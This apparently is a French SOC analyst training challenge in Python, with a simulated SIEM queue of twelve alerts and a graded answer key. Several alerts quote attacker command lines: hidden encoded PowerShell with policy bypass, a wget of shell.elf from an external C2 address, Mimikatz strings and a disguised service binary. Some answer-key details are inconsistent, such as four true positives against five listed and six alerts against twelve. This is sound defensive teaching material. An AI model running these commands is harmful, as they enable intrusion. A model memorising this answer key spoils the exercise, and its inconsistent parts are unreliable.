"""
Challenge 3 — Triage d'Alertes SIEM
Niveau : 1 (Analyste Junior)
Catégorie : SIEM
"""

ARTIFACT_ALERTS = r"""
================================================================================
   ____  ___ _____  __  __   ____    _    ____  _   _ ____   ___    _    ____  ____
  / ___|_ _| ____||  \/  | |  _ \  / \  / ___|| | | | __ ) / _ \  / \  |  _ \|  _ \
  \___ \| ||  _|  | |\/| | | | | |/ _ \ \___ \| |_| |  _ \| | | |/ _ \ | |_) | | | |
   ___) | || |___ | |  | | | |_| / ___ \ ___) |  _  | |_) | |_| / ___ \|  _ <| |_| |
  |____/___|_____||_|  |_| |____/_/   \_\____/|_| |_|____/ \___/_/   \_\_| \_\____/
================================================================================
  INSTANCE   : SIEM-PROD-01.redpawn-corp.local
  DATE       : 18/02/2026
  SHIFT      : 08h00 — 16h00 (Equipe Alpha)
  ANALYSTE   : <en attente d'assignation>
  EN ATTENTE : 12 alertes non triées
================================================================================

──────────────── ALERTE #1 ── SIEM-2026-4401 ── LOW ───────────────────

  Horodatage : 2026-02-18 08:05:33 UTC
  Règle      : Windows — User Account Locked Out
  Sévérité   : ███░░░░░░░ LOW
  Source     : SRV-AD-01 (10.0.1.10) — Domain Controller
  Account    : l.mercier (Service Commercial)

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ Event 4740 — Account Lockout
  │ Compte verrouillé après 5 tentatives échouées
  │ Source workstation : WKS-SALES-PC02 (10.0.6.15)
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : l.mercier est revenu de vacances hier, avait changé son
               mot de passe via le portail web avant de partir.
               Son poste avait encore les anciennes credentials en cache.
               Le Helpdesk a déjà un ticket ouvert #HD-2026-0412.

──────────────── ALERTE #2 ── SIEM-2026-4402 ── MEDIUM ────────────────

  Horodatage : 2026-02-18 08:34:12 UTC
  Règle      : Windows — Scheduled Task Created via Command Line
  Sévérité   : ██████░░░░ MEDIUM
  Source     : WKS-COMPTA-PC03 (10.0.3.45) — User: j.martin
  Processus  : cmd.exe → schtasks.exe
  Parent PID : cmd.exe (PID 7823, started from explorer.exe)

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ schtasks.exe /create /tn "GoogleUpdate" /tr
  │ "powershell -ep bypass -w hidden -e SQBFAFgAIAAoA..." /sc minute /mo 5
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : La tâche planifiée utilise un nom légitime (GoogleUpdate)
               mais exécute du PowerShell encodé en base64 avec les flags
               bypass et hidden

──────────────── ALERTE #3 ── SIEM-2026-4403 ── LOW ───────────────────

  Horodatage : 2026-02-18 08:52:11 UTC
  Règle      : Network — Internal Port Scan Detected
  Sévérité   : ███░░░░░░░ LOW
  Source     : SRV-VULN-01 (10.0.7.100) — User: svc-nessus
  Processus  : nessusd

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ Scan de 254 hôtes détecté sur 10.0.1.0/24
  │ Ports scannés : 22, 80, 135, 139, 443, 445, 3389, 8080
  │ 1,847 connexions en 12 minutes
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : SRV-VULN-01 est le scanner Nessus de l'équipe sécurité.
               Un scan de vulnérabilité mensuel est planifié chaque
               3ème mardi du mois. Le 18/02/2026 est un mardi.
               Ticket de changement #CHG-2026-0201 approuvé.

──────────────── ALERTE #4 ── SIEM-2026-4404 ── LOW ───────────────────

  Horodatage : 2026-02-18 09:12:33 UTC
  Règle      : Network — DNS Query to Newly Registered Domain
  Sévérité   : ███░░░░░░░ LOW
  Source     : WKS-DEV-PC07 (10.0.5.12) — User: a.bernard
  Processus  : chrome.exe

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ DNS query → "update-service-cdn.xyz" (enregistré il y a 2 jours)
  │ Résolution vers 45.33.21.99
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : Le développeur a.bernard naviguait et a cliqué sur
               une publicité. Le domaine a été visité une seule fois.
               Aucun téléchargement détecté.
               VirusTotal: 0/72 détections

──────────────── ALERTE #5 ── SIEM-2026-4405 ── MEDIUM ────────────────

  Horodatage : 2026-02-18 09:30:55 UTC
  Règle      : Endpoint — PowerShell Execution with Encoded Command
  Sévérité   : ██████░░░░ MEDIUM
  Source     : SRV-DEPLOY-01 (10.0.7.50) — User: svc-ansible
  Processus  : powershell.exe
  Parent PID : ansible-playbook (PID 2345)

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ powershell.exe -EncodedCommand JABzAGUAcgB2AGkAYwBlACAA...
  │ Decoded: $service = Get-Service -Name 'monitoring-agent';
  │          if ($service.Status -ne 'Running') { Start-Service ... }
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : SRV-DEPLOY-01 est le serveur Ansible de l'équipe DevOps.
               L'EncodedCommand est utilisé par Ansible pour éviter les
               problèmes d'échappement. Playbook planifié dans AWX.
               Vérifié : le contenu décodé est bénin (restart service).

──────────────── ALERTE #6 ── SIEM-2026-4406 ── CRITICAL ──────────────

  Horodatage : 2026-02-18 09:45:01 UTC
  Règle      : Endpoint — Mimikatz Pattern Detected in Memory
  Sévérité   : ██████████ CRITICAL
  Source     : SRV-AD-01 (10.0.1.10) — Domain Controller
  Processus  : rundll32.exe (PID 9981) → injection dans lsass.exe
  User       : REDPAWN\svc-backup (compte de service)

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ Strings "sekurlsa::logonpasswords" et "privilege::debug" détectées
  │ en mémoire dans le processus lsass.exe
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : Le compte svc-backup ne devrait pas interagir avec
               lsass.exe. Activité hors heures de backup habituelles
               (normalement 02h-04h).

──────────────── ALERTE #7 ── SIEM-2026-4407 ── HIGH ──────────────────

  Horodatage : 2026-02-18 10:05:17 UTC
  Règle      : Network — Outbound Connection to Tor Exit Node
  Sévérité   : ████████░░ HIGH
  Source     : WKS-RH-PC01 (10.0.4.22) — User: s.moreau
  Processus  : tor.exe (C:\Users\s.moreau\Desktop\Tor\tor.exe)

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ Connexion TCP sortante vers 185.220.101.34:443 (Tor Exit Node connu)
  │ Volume de données : 2.3 MB envoyés, 156 KB reçus
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : L'installation de Tor n'est pas autorisée par la
               politique de sécurité. Le ratio upload/download (15:1)
               est inhabituel — possible exfiltration.

──────────────── ALERTE #8 ── SIEM-2026-4408 ── MEDIUM ────────────────

  Horodatage : 2026-02-18 10:15:40 UTC
  Règle      : Windows — Suspicious certutil.exe Usage
  Sévérité   : ██████░░░░ MEDIUM
  Source     : WKS-IT-PC03 (10.0.5.30) — User: t.girard
  Processus  : cmd.exe → certutil.exe

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ certutil -hashfile C:\Users\t.girard\Downloads\putty-0.81.exe SHA256
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : t.girard est un administrateur système. Il vérifie
               le hash SHA256 du binaire PuTTY téléchargé depuis le
               site officiel avant installation. Certutil est souvent
               flaggé par les SIEM mais la commande -hashfile est
               une utilisation légitime, contrairement à -urlcache.

──────────────── ALERTE #9 ── SIEM-2026-4409 ── MEDIUM ────────────────

  Horodatage : 2026-02-18 10:30:44 UTC
  Règle      : Windows — Service Installed via sc.exe
  Sévérité   : ██████░░░░ MEDIUM
  Source     : SRV-FILE-02 (10.0.1.30) — User: SYSTEM
  Processus  : cmd.exe → sc.exe

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ sc.exe create "WinDefenderUpdate" binpath= "C:\Windows\Temp\svc.exe"
  │ start= auto
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : Service créé dans un répertoire Temp avec un nom imitant
               Windows Defender. Le hash SHA256 de svc.exe :
               a3f2b8c1...9e7d (non connu de VirusTotal)
               Le parent cmd.exe a été lancé via PsExec depuis
               10.0.3.45 (WKS-COMPTA-PC03)

──────────────── ALERTE #10 ── SIEM-2026-4410 ── HIGH ─────────────────

  Horodatage : 2026-02-18 10:45:22 UTC
  Règle      : Endpoint — Brute Force SSH Detected
  Sévérité   : ████████░░ HIGH
  Source     : SRV-WEB-01 (10.0.1.20) — Service: sshd
  Attaquant  : 185.234.72.19 (externe)

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ 847 tentatives de connexion SSH échouées en 23 minutes
  │ 28 comptes testés : root, admin, deploy, ftpuser, ubuntu, ...
  │ 1 connexion réussie (ftpuser) après 847 échecs
  │ Post-auth: wget http://185.234.72.19:8080/shell.elf
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : L'IP 185.234.72.19 est la même que celle utilisée
               comme C2 dans d'autres alertes. Connexion réussie
               suivie d'un téléchargement de binaire suspect.

──────────────── ALERTE #11 ── SIEM-2026-4411 ── LOW ──────────────────

  Horodatage : 2026-02-18 11:00:02 UTC
  Règle      : Windows — GPO Modified
  Sévérité   : ███░░░░░░░ LOW
  Source     : SRV-AD-01 (10.0.1.10) — User: admin.rsi
  Processus  : mmc.exe → Group Policy Editor

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ GPO "Default Domain Policy" modifiée
  │ Changement : Ajout script de logon "deploy-agent.ps1"
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : L'admin.rsi est l'administrateur système principal.
               Un ticket de changement #CHG-2026-0218 existe pour le
               déploiement d'un nouvel agent de monitoring sur tous
               les postes. Le changement a été approuvé par le RSSI.

──────────────── ALERTE #12 ── SIEM-2026-4412 ── MEDIUM ───────────────

  Horodatage : 2026-02-18 11:15:30 UTC
  Règle      : Windows — RDP Session from Unusual Source
  Sévérité   : ██████░░░░ MEDIUM
  Source     : IT Admin VPN Pool (10.0.8.45)
  Destination: SRV-FILE-02 (10.0.1.30)
  User       : admin.rsi

  ┌ Détail ─────────────────────────────────────────────────────────────
  │ Session RDP établie depuis le pool VPN vers le serveur de fichiers
  │ Durée : 12 minutes
  │ Activité: Accès SYSVOL, consultation logs Event Viewer
  └─────────────────────────────────────────────────────────────────────

  ℹ Contexte : admin.rsi est connecté en VPN (télétravail le mardi).
               Il vérifie que le script de déploiement de l'agent
               monitoring fonctionne correctement (lié au ticket
               #CHG-2026-0218). Activité cohérente avec son rôle.

================================================================================
  FIN DU RAPPORT — 12 alertes en attente de triage
================================================================================
"""

CHALLENGE = {
    "id": "c03_siem_triage",
    "title": "🔔 La Queue d'Alertes du Lundi",
    "category": "siem",
    "level": 1,
    "points_total": 460,
    "estimated_time": "35-50 min",
    "story": """
## 📋 Briefing de Mission

**Date :** 18 février 2026, 11h30  
**Priorité :** NORMALE  
**Source :** Tâche courante — Triage des alertes SIEM

---

Vous prenez votre shift en tant qu'analyste SOC N1. Le dashboard SIEM affiche **12 alertes non triées** de la matinée. C'est un mardi chargé — il y a du bruit, des opérations légitimes, et potentiellement de vraies menaces dans le lot.

Votre mission : trier chaque alerte, déterminer sa classification (Vrai Positif, Faux Positif, ou Bénin Vrai Positif), et identifier les actions de remédiation prioritaires.

> *"12 alertes dans la queue ce matin, certaines sont probablement du bruit mais je veux que tu vérifies tout. Pour chaque alerte, dis-moi si c'est un TP, FP ou BTP, et pourquoi. N'oublie pas de regarder les corrélations entre alertes."*

<details>
<summary>💡 Rappel des classifications (cliquez pour afficher)</summary>

| Classification | Abréviation | Signification | Exemple |
|---|---|---|---|
| **True Positive** | **TP** | L'alerte détecte une **vraie menace** qui nécessite investigation et action immédiate. | Un ransomware chiffre des fichiers sur un serveur de production |
| **False Positive** | **FP** | L'alerte se déclenche **à tort** — il n'y a aucune menace réelle. Le comportement détecté est inoffensif. | Un scan de vulnérabilité planifié par l'équipe IT déclenche une alerte IDS |
| **Benign True Positive** | **BTP** | L'alerte détecte un **vrai comportement** correspondant à la règle, mais l'activité est **légitime et autorisée**. Pas de menace. | Un pentester autorisé déclenche une alerte en exécutant un outil offensif dans le cadre d'un audit approuvé |

</details>
    """,
    "artifacts": [
        {
            "name": "siem_alerts_dashboard.txt",
            "type": "siem",
            "content": ARTIFACT_ALERTS,
            "description": "Dashboard SIEM — 6 alertes non triées du matin"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Alerte #2 (Scheduled Task via CLI) — Quelle est la classification ? (TP, FP, ou BTP)",
            "answer": "TP",
            "flag": "REDPAWN{TP}",
            "points": 40,
            "max_attempts": 2,
            "hints": [
                "Une tâche planifiée nommée 'GoogleUpdate' qui exécute du PowerShell encodé en base64...",
                "Les flags -ep bypass -w hidden sont des indicateurs classiques de malware"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "Alerte #3 (Internal Port Scan) — Quelle est la classification ? (TP, FP, ou BTP)",
            "answer": "BTP",
            "flag": "REDPAWN{BTP}",
            "points": 40,
            "max_attempts": 2,
            "hints": [
                "Vérifiez si un scan de vulnérabilité était planifié ce jour-là",
                "Le serveur Nessus scanne selon un planning mensuel approuvé"
            ],
            "hint_cost": 13
        },
        {
            "id": "q3",
            "text": "Alerte #5 (PowerShell Encoded Command) — Quelle est la classification ? (TP, FP, ou BTP)",
            "answer": "BTP",
            "flag": "REDPAWN{BTP}",
            "points": 40,
            "max_attempts": 2,
            "hints": [
                "Qui exécute cette commande et depuis quel outil ?",
                "Ansible utilise -EncodedCommand normalement, et le contenu décodé est bénin"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Alerte #6 (Mimikatz Pattern) — Quelle est la classification ? (TP, FP, ou BTP)",
            "answer": "TP",
            "flag": "REDPAWN{TP}",
            "points": 40,
            "max_attempts": 2,
            "hints": [
                "Mimikatz sur un Domain Controller est TOUJOURS critique",
                "Le compte de service est utilisé en dehors de ses heures normales"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "Alerte #8 (certutil.exe) — Quelle est la classification ? (TP, FP, ou BTP)",
            "answer": "BTP",
            "flag": "REDPAWN{BTP}",
            "points": 40,
            "max_attempts": 2,
            "hints": [
                "La commande certutil a de nombreuses utilisations — lesquelles sont suspectes vs légitimes ?",
                "-hashfile est légitime (vérification d'intégrité), -urlcache serait suspect"
            ],
            "hint_cost": 13
        },
        {
            "id": "q6",
            "text": "Quelle alerte doit être investiguée EN PREMIER ? (donnez le numéro #)",
            "answer": "6",
            "flag": "REDPAWN{6}",
            "points": 50,
            "hints": [
                "Quelle alerte a la plus haute sévérité ET le plus grand impact potentiel ?",
                "Mimikatz sur un Domain Controller = compromission de tout le domaine AD"
            ],
            "hint_cost": 17
        },
        {
            "id": "q7",
            "text": "Trois alertes sont liées au même attaquant ou à la même chaîne d'attaque. Quels sont leurs numéros ? (format: X,Y,Z par ordre croissant)",
            "answer": "2,9,10",
            "flag": "REDPAWN{2,9,10}",
            "points": 60,
            "hints": [
                "Cherchez des éléments communs : IPs, machines, comptes",
                "L'alerte #9 mentionne PsExec depuis 10.0.3.45 (WKS-COMPTA-PC03), la même machine que l'alerte #2, et l'alerte #10 partage la même IP C2"
            ],
            "hint_cost": 20
        },
        {
            "id": "q8",
            "text": "Dans l'alerte #7 (Tor), quel ratio upload/download suggère une exfiltration de données ?",
            "answer": "15:1",
            "flag": "REDPAWN{15:1}",
            "points": 40,
            "hints": [
                "Regardez les volumes de données dans l'alerte #7",
                "2.3 MB envoyés vs 156 KB reçus"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Combien d'alertes au total classifiez-vous comme True Positive (vraie menace) ?",
            "answer": "4",
            "flag": "REDPAWN{4}",
            "points": 50,
            "hints": [
                "Revoyez chaque alerte : certaines semblent différentes mais font partie de la même attaque",
                "Alertes #2 (schtask malveillante), #6 (Mimikatz), #7 (Tor exfil), #9 (service malveillant), #10 (brute force SSH) — mais #7 est-elle liée à l'attaque externe ou interne ?"
            ],
            "hint_cost": 17
        },
        {
            "id": "q10",
            "text": "Combien de comptes utilisateurs distincts sont impliqués dans les alertes TP (vraies menaces) ?",
            "answer": "4",
            "flag": "REDPAWN{4}",
            "points": 40,
            "hints": [
                "Listez les comptes de chaque alerte classée TP",
                "j.martin, svc-backup, s.moreau, SYSTEM — ou l'attaquant externe 185.234.72.19"
            ],
            "hint_cost": 13
        }
    ]
}
